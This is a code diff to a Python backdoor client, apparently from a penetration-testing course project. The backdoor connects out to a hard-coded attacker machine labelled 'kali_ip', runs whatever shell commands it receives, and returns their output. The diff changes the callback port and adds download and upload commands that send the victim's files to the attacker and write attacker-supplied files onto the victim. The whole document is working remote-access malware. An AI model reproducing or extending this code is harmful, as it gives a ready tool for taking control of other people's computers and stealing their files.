@@ -5,7 +5,7 @@ import json
 import os
 
 kali_ip = "192.168.0.8"
-kali_port = 4444
+kali_port = 5555
 
 def connection():
     while True:
@@ -32,11 +32,33 @@ def shell():
             os.chdir(command[3:])
         elif command == 'clear':
             pass
+        elif command[:8] == 'download':
+            upload_file(command[9:])
+        elif command[:6] == 'upload':
+            download_file(command[7:])
         else: 
             execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
             result = result.decode()
             reliable_send(result)
+
+def upload_file(filename): 
+    f = open(filename, 'rb')
+    sock.send(f.read())
+
+def download_file(filename):
+    f = open(filename, 'wb')
+    # so that our program does not crash
+    chunk = sock.recv(1024)
+    sock.settimeout(1)
+    while chunk: 
+        f.write(chunk)
+        try:
+            chunk = sock.recv(1024)
+        except socket.timeout as e:
+            break
+    sock.settimeout(None)
+    f.close()
 
 def reliable_send(data):
     # data is our command and parses it to json
